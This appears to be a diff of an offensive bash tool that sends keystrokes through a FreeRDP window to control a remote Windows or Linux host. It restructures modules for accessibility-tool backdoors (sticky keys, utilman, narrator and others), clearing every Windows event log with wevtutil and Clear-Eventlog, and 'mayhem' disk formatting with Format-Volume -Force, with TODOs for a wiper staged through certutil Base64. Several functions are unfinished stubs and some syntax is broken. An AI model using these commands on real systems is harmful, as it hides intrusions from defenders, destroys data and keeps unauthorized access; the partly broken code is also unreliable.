-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "UAC only exists on Windows operating system!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
     echo "Not implemented"
 }
 
-function create_user() {
-    local action="${1}"
-    read -d '' windows_description << EOF
-Fill in the description of the technique
-EOF
-    read -d '' linux_description << EOF
-Fill in the description of the technique
-EOF
-
-    # TODO: Print out information with commands to instruct the user both commands and cmdlet
-    # Add a cleanup method
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Create Windows User Account"
-        echo "${windows_description}"
-    elif [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Create Linux User Account"
-        echo "${linux_description}"
-    else
-        print_status "error" "Invalid mode!"
-    fi
-    if [[ "${PLATFORM}" == "windows" ]]
-    then
-        echo "Windows"
-    elif [[ "${PLATFORM}" == "linux" ]]
-    then
-        echo "Linux"
-    fi
-}
-
-function sticky_keys() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    # TODO: Print out information with commands to instruct the user both commands and cmdlet
-    # Add a cleanup method
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "Registry keys only exists on Windows operating system!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Sticky Keys"
-        echo "${description}"
-    elif [[ "${action}" == "backdoor" ]]
-    then
-        print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
-        print_status "information" "Pressing SHIFT key 5 times"
-        for (( i=1; i<=5; i++ ))
-        do
-            print_status "progress" "SHIFT: ${i}"
-            keyboard "shift" "custom_keystroke"
-        done
-        print_status "completed" "Backdoor activated!"
-    else
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function utility_manager() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    # TODO: Print out information with commands to instruct the user both commands and cmdlet
-    # Add a cleanup method
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "Registry keys only exists on Windows operating system!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Utility Manager"
-        echo "${description}"
-    elif [[ "${action}" == "backdoor" ]]
-    then
-        print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-        keyboard "Super+u" "custom_keystroke"
-        print_status "completed" "Backdoor activated!"
-    else
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function magnifier() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    # TODO: Print out information with commands to instruct the user both commands and cmdlet
-    # Add a cleanup method
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "Registry keys only exists on Windows operating system!"
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Magnifier"
-        echo "${description}"
-    elif [[ "${action}" == "backdoor" ]]
-    then
-        print_status "progress" "Activating magnifier.exe backdoor..."
-        keyboard "Super+equal" "custom_keystroke"
-        keyboard "Super+minus" "custom_keystroke"
-        print_status "completed" "Backdoor activated!"
-    else
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function narrator() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    # TODO: Print out information with commands to instruct the user both commands and cmdlet
-    # Add a cleanup method
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "Registry keys only exists on Windows operating system!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Narrator"
-        echo "${description}"
-    elif [[ "${action}" == "backdoor" ]]
-    then
-        print_status "progress" "Activating narrator.exe backdoor..."
-        keyboard "Super+Return" "custom_keystroke"
-        print_status "completed" "Backdoor activated!"
-    else
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function display_switch() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    # TODO: Print out information with commands to instruct the user both commands and cmdlet
-    # Add a cleanup method
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "Registry keys only exists on Windows operating system!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Display Switch"
-        echo "${description}"
-    elif [[ "${action}" == "backdoor" ]]
-    then
-        print_status "progress" "Activating displayswitch.exe backdoor..."
-        keyboard "Super+p" "custom_keystroke"
-        print_status "completed" "Backdoor activated!"
-    else
-        print_status "error" "Invalid mode!"
-    fi
-}
-
 function persistence() {
-    local persistence_method="${1}"
-    local persistence_action="${2}"
+    local method="${1}"
+    local action="${2}"
 
+    function create_user() {
+        read -rd '' windows_description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+        read -rd '' linux_description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        # TODO: Print out information with commands to instruct the user both commands and cmdlet
+        # Add a cleanup method
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Create Windows User Account"
+            echo "${windows_description}"
+        elif [[ "${action}" == "info" ]]
+        then
+            info "Create Linux User Account"
+            echo "${linux_description}"
+        else
+            error "Invalid mode!"
+        fi
+        if [[ "${PLATFORM}" == "windows" ]]
+        then
+            echo "Windows"
+        elif [[ "${PLATFORM}" == "linux" ]]
+        then
+            echo "Linux"
+        fi
+    }
+
+    function sticky_keys() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+        # TODO: Print out information with commands to instruct the user both commands and cmdlet
+        # Add a cleanup method
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "Registry keys only exists on Windows operating system!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Sticky Keys"
+            echo "${description}"
+        elif [[ "${action}" == "backdoor" ]]
+        then
+            info "Activating sethc.exe (sticky keys) backdoor..."
+            info "Pressing SHIFT key 5 times"
+            for ((i = 1; i <= 5; i++))
+            do
+                info "SHIFT: ${i}"
+                keyboard "shift" "custom_keystroke"
+            done
+            finish "Backdoor activated!"
+        else
+            error "Invalid mode!"
+        fi
+    }
+
+    function utility_manager() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+        # TODO: Print out information with commands to instruct the user both commands and cmdlet
+        # Add a cleanup method
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "Registry keys only exists on Windows operating system!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Utility Manager"
+            echo "${description}"
+        elif [[ "${action}" == "backdoor" ]]
+        then
+            info "Activating utilman.exe (utility manager) backdoor..."
+            keyboard "Super+u" "custom_keystroke"
+            finish "Backdoor activated!"
+        else
+            error "Invalid mode!"
+        fi
+    }
+
+    function magnifier() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+        # TODO: Print out information with commands to instruct the user both commands and cmdlet
+        # Add a cleanup method
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "Registry keys only exists on Windows operating system!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Magnifier"
+            echo "${description}"
+        elif [[ "${action}" == "backdoor" ]]
+        then
+            info "Activating magnifier.exe backdoor..."
+            keyboard "Super+equal" "custom_keystroke"
+            keyboard "Super+minus" "custom_keystroke"
+            finish "Backdoor activated!"
+        else
+            error "Invalid mode!"
+        fi
+    }
+
+    function narrator() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+        # TODO: Print out information with commands to instruct the user both commands and cmdlet
+        # Add a cleanup method
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "Registry keys only exists on Windows operating system!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Narrator"
+            echo "${description}"
+        elif [[ "${action}" == "backdoor" ]]
+        then
+            info "Activating narrator.exe backdoor..."
+            keyboard "Super+Return" "custom_keystroke"
+            finish "Backdoor activated!"
+        else
+            error "Invalid mode!"
+        fi
+    }
+
+    function display_switch() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+        # TODO: Print out information with commands to instruct the user both commands and cmdlet
+        # Add a cleanup method
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "Registry keys only exists on Windows operating system!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Display Switch"
+            echo "${description}"
+        elif [[ "${action}" == "backdoor" ]]
+        then
+            info "Activating displayswitch.exe backdoor..."
+            keyboard "Super+p" "custom_keystroke"
+            finish "Backdoor activated!"
+        else
+            error "Invalid mode!"
+        fi
+    }
     # -a, --action flag "info,backdoor". For "info" contains the execution commands
     # for both command prompt and powershell. To enumerate, persistence and cleanup
     # For "backdoor" to activate the backdoor
     # TODO: Fill in the rest of the persistence methods
-    case "${persistence_method}" in
-        createuser)
-            create_user "${persistence_action}"
+    case "${method}" in
+        "createuser")
+            create_user
             ;;
-        sethc)
-            sticky_keys "${persistence_action}"
+        "sethc")
+            sticky_keys
             ;;
-        utilman)
-            utility_manager "${persistence_action}"
+        "utilman")
+            utility_manager
             ;;
-        magnifier)
-            magnifier "${persistence_action}"
+        "magnifier")
+            magnifier
             ;;
-        narrator)
-            narrator "${persistence_action}"
+        "narrator")
+            narrator
             ;;
-        displayswitch)
-            display_switch "${persistence_action}"
+       "displayswitch")
+            display_switch
             ;;
         *)
-            print_status "error" "Invalid Persistence Technique!" >&2
-            exit 1
+            error "Invalid Persistence Technique!" >&2
+            quit 1
             ;;
     esac
 }
 
-function window_event_log_utility() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "This method is only exclusive for windows!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Clear Windows Event Logs"
-        echo "${description}"
-    elif [[ "${action}" == "quick" ]]
-    then
-        execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [[ "${action}" == "full" ]]
-    then
-    # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
-        echo "not implemented"
-    else
-    # TODO: If the mode was invalid display the available options to inform the user
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function clear_event_log() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    if [[ "${platform}" != "windows" ]]
-    then
-        print_status "error" "This method is only exclusive for windows!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        print_status "information" "Clear Windows Event Logs via PowerShell"
-        echo "${description}"
-    elif [[ "${action}" == "quick" ]]
-    then
-        execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
-    elif [[ "${action}" == "full" ]]
-    then
-    # TODO: Include the wiper and then transfer it with Base64 powershell terminal
-        echo "not implemented"
-    else
-    # TODO: If the mode was invalid display the available options to inform the user
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function event_viewer() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "This method is only exclusive for windows!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ "${action}" == "info" ]]
-    then
-        # TODO: Include information of this technique
-        print_status "information" "Event Viewer"
-        echo "${description}"
-    elif [[ "${action}" == "manual" ]]
-    then
-        dialogue_box "eventvwr.msc"
-    else
-        # TODO: If the mode was invalid display the available options to inform the user
-        print_status "error" "Invalid mode!"
-    fi
-}
-
-function clear_registry_values() {
-    # TODO: Converth these commands into powershell cmdlets
-    # reg.exe delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /reg:64 /f
-    # reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /va /reg:64 /f
-    echo ""
-}
-
 function antiforensics() {
-    local antiforensics_method="${1}"
-    local antiforensics_action="${2}"
+    local method="${1}"
+    local action="${2}"
+
+    function window_event_log_utility() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "This method is only exclusive for windows!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Clear Windows Event Logs"
+            echo "${description}"
+        elif [[ "${action}" == "quick" ]]
+        then
+            read_input "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
+        elif [[ "${action}" == "full" ]]
+        then
+        # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
+            echo "not implemented"
+        else
+        # TODO: If the mode was invalid display the available options to inform the user
+            error "Invalid mode!"
+        fi
+    }
+
+    function clear_event_log() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "This method is only exclusive for windows!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            info "Clear Windows Event Logs via PowerShell"
+            echo "${description}"
+        elif [[ "${action}" == "quick" ]]
+        then
+            read_input "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
+        elif [[ "${action}" == "full" ]]
+        then
+        # TODO: Include the wiper and then transfer it with Base64 powershell terminal
+            echo "not implemented"
+        else
+        # TODO: If the mode was invalid display the available options to inform the user
+            error "Invalid mode!"
+        fi
+    }
+
+    function event_viewer() {
+        read -d '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "This method is only exclusive for windows!"
+            quit 1
+        fi
+
+        if [[ "${action}" == "info" ]]
+        then
+            # TODO: Include information of this technique
+            info "Event Viewer"
+            echo "${description}"
+        elif [[ "${action}" == "manual" ]]
+        then
+            dialogue_box "eventvwr.msc"
+        else
+            # TODO: If the mode was invalid display the available options to inform the user
+            error "Invalid mode!"
+        fi
+    }
+
+    function clear_registry_values() {
+        # TODO: Convert these commands into powershell cmdlets
+        # reg.exe delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /reg:64 /f
+        # reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /va /reg:64 /f
+        echo ""
+    }
     # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box
 
     # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
@@ -1430,52 +1566,106 @@ function antiforensics() {
     # Batch script
     # Powershell script
     # Bash script
-    case "${antiforensics_method}" in
-        wevtutil)
-            window_event_log_utility "${antiforensics_method}" "${antiforensics_action}"
+    case "${method}" in
+        "wevtutil")
+            window_event_log_utility "${method}" "${action}"
             ;;
-        clearevent)
-            clear_event_log "${antiforensics_method}" "${antiforensics_action}"
+        "clearevent")
+            clear_event_log "${method}" "${action}"
             ;;
-        eventvwr)
-            event_viewer "${antiforensics_method}" "${antiforensics_action}"
+        "eventvwr")
+            event_viewer "${method}" "${action}"
             ;;
         *)
-            print_status "error" "Invalid Antiforensic Technique!" >&2
-            exit 1
+            error "Invalid Antiforensic Technique!" >&2
+            quit 1
             ;;
     esac
 }
 
-function format_disk() {
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    if [[ "${action}" == "info" ]]
-    then
-        # TODO: Include information of this technique
-        print_status "information" "Format Disk"
-        echo "${description}"
-    elif [[ "${action}" == "diskpart" ]]
-    then
-        echo "diskpart.exe"
-    else
-        # TODO: If the mode was invalid display the available options to inform the user
-        print_status "error" "Invalid mode!"
-    fi
-}
-
 function mayhem() {
-    local mayhem_method="${1}"
-    local mayhem_action="${2}"
+    local method="${1}"
+    local action="${2}"
 
-    echo "not implemented"
+    function format_disk() {
+        local mode="${1}"
+
+        read -rd '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
+        then
+            error "Only both linux and windows are supported for this method!"
+            quit 1
+        fi
+
+        if [[ "${PLATFORM}" == "windows" ]]
+            if [[ "${mode}" == "diskpart" ]]
+            then
+                if [[ "${action}" == "info" ]]
+                then
+                    # TODO: Include information of this technique
+                    info "Format Disk"
+                    echo "${description}"
+                elif [[ "${action}" == "cmd" ]]
+                then
+                    echo "diskpart.exe"
+                else
+                    # TODO: If the mode was invalid display the available options to inform the user
+                    error "Invalid mode!"
+                fi
+            elif [[ "${mode}" == "cmdlet" ]]
+            then
+                echo "New-Partition -DiskNumber 1 -UseMaximumSize -AssignDriveLetter C"
+                echo "Format-Volume -DriveLetter C -FileSystemLabel "New" -FileSystem NTFS -Full -Force -Confirm:\$false"
+            fi
+        if [[ "${PLATFORM}" == "linux" && "${mode}" == "shred" ]]
+        then
+            echo "shred and dd"
+        fi
+    }
+
+    function boot_partition() {
+        local mode="${1}"
+
+        read -rd '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
+        then
+            error "Only both linux and windows are supported for this method!"
+            quit 1
+        fi
+
+        echo "not yet implemented"
+        exit 1
+    }
+
+    case "${method}" in
+        "diskpart")
+            format_disk "diskpart"
+            ;;
+        "pwsh")
+            format_disk "cmdlet"
+            ;;
+        "shred")
+            format_disk "console"
+            ;;
+        "mbr")
+            boot_partition ""
+        *)
+            error "Invalid anti-forensic technique!" >&2
+            quit 1
+            ;;
+    esac
 }
 
+# I need to tell the user how to fucking use me
 function usage() {
     echo "Usage:
-    $(base_name ${0}) <flags>
+    $(basename ${0}) <flags>
 
 Flags:
 
@@ -1490,7 +1680,8 @@ COMMON OPTIONS:
                                         active window (\"freerdp\" is set by default
                                         if not specified)
 
-    -h, --help                          Display this help message
+    -v, --version                       Display the program's version number
+    -h, --help                          Display the help menu
 
 UPLOAD FILES:
     -i, --input <input_file>            Specify the local input file to transfer
@@ -1510,22 +1701,49 @@ METHODS:
     -a, --action <action>               Specify an action from a method and/or
                                         submethod (applies with -m and/or -s flag)
 
-    -e, --evasion <evasion>             Specify an evasion method for uploading files
+    -e, --evasion <evasion>             Specify an evasion method for file upload
                                         (only works for \"pwshb64\")"
-    exit 1
+    quit 0
+}
+
+function subcommand() {
+    local suboption="${1}"
+
+    case "${suboption}" in
+        "execute")
+            shift
+            ;;
+        "upload")
+            shift
+            ;;
+        "elevate")
+            shift
+            ;;
+        "persistence")
+            shift
+            ;;
+        "antiforensics")
+            shift
+            ;;
+        "mayhem")
+            shift
+            ;;
+    esac
 }
 
 function main() {
-    check_dependencies
+    OPTIONS="c:i:o:m:s:a:e:p:w:v:h"
+    LONG_OPTIONS="command:,input:,output:,method:,submethod:,action:,evasion:,platform:,windowname:,version:,help"
 
-    if [[ ${#} -eq 0 ]]
+    if ((${?} != 0))
     then
-        usage
+        error "Failed to parse options... Exiting." >&2
+        quit 1
     fi
 
-    # TODO: -v, --variant
-    # -v <legacy | default>
-    while [[ ${#} -gt 0 ]]
+    eval set -- "${PARSED_OPTIONS}"
+
+    while true
     do
         case ${1} in
             -c | --command)
@@ -1564,8 +1782,16 @@ function main() {
                 WINDOWNAME="${2}"
                 shift 2
                 ;;
+            -v | --version)
+                VERSION=1
+                shift
+                ;;
             -h | --help)
                 usage
+                ;;
+            --)
+                shift
+                break
                 ;;
             *)
                 echo "Invalid option: ${1}" >&2
@@ -1574,6 +1800,14 @@ function main() {
         esac
     done
 
+    trap quit SIGINT
+    check_dependencies
+
+    ((VERSION == 1)) && echo "${0} version: v1.0"
+
+    subcommand "execute"
+
+    # TODO: Put all of this in get_window_name function to be applied globally
     # If window name isn't specified it'll set to FreeRDP as default.
     if [[ (-z "${WINDOWNAME}" || "${WINDOWNAME,,}" == "freerdp") ]]
     then
@@ -1583,26 +1817,16 @@ function main() {
         WINDOWNAME="${WINDOWNAME}"
     fi
 
-    # Checks if the program exists.
     if [[ ! $(get_window_name) ]]
     then
-        print_status "error" "Application name is absent or invalid window name."
-        print_status "information" "Terminating program..."
-        exit 1
+        error "Application name is absent or invalid window name."
+        quit 1
     fi
-
-    if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
+    # When input is string and not a file. It executes command
+    if [[ -n "${COMMAND}" ]]
     then
-        # When input is string and not a file. It executes command
-        if [[ -z "${METHOD}" ]]
-        then
-            METHOD="none"
-        fi
-        execute "${COMMAND}" "${METHOD}"
-    elif [[ -f "${COMMAND}" ]]
-    then
-        # Check if a file is passed as input then execute commands
-        automate "${COMMAND}"
+        [[ -z "${METHOD}" ]] && METHOD="none"
+        read_input "${COMMAND}" "${METHOD}"
     fi
 
     # When the input for selecting an operating system is empty
@@ -1612,11 +1836,11 @@ function main() {
         PLATFORM="windows"
     elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
     then
-        print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
-        exit 1
+        error "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
+        quit 1
     fi
 
-    if [[ -f "${INPUT}" && -n "${OUTPUT}" ]]
+    if [[ -n "${INPUT}" && -n "${OUTPUT}" ]]
     then
         upload "${INPUT}" "${OUTPUT}" "${METHOD}" "${ACTION}" "${EVASION}"
     elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
